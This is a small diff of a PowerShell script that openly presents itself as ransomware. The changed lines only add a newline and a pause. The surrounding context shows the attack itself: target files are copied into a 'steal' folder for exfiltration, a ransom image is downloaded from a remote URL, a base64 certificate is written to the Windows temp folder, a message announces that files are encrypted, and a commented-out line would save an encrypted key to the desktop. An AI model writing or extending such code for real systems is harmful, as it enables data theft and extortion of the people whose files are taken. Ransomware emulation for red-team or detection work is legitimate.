@@ -152,7 +152,7 @@ $cp = robocopy /E $Source $Destination
 $Destination = "C:\temp\steal"
 $files = Get-ChildItem -Path $Destination -Recurse
 
-Write-Host "[+] Moving target files to temp location for exfil..."
+Write-Host "`n[+] Moving target files to temp location for exfil..."
 For($i = 1; $i -le $files.count; $i++)
 
 { Write-Progress -Activity "“Collecting files” -status “Finding file $i”" -percentComplete ($i / $files.count*100)}
@@ -306,6 +306,7 @@ Invoke-WebRequest -Uri $ransom -OutFile "c:/temp/ransom.jpg" | Out-Null
 
 Write-Host "`n`n[+] Target files encrypted..." -ForegroundColor White
 $encodedcert =  [IO.File]::WriteAllBytes("c:/windows/temp/x.cer", [Convert]::FromBase64String($encodedcert))
+Start-Sleep 2
 #echo (Protect-CmsMessage -Content $pwd -To "c:/windows/temp/x.cer") > /users/$env:USERNAME/desktop/encrypted_key.txt
 
 # Start-Sleep -s 10
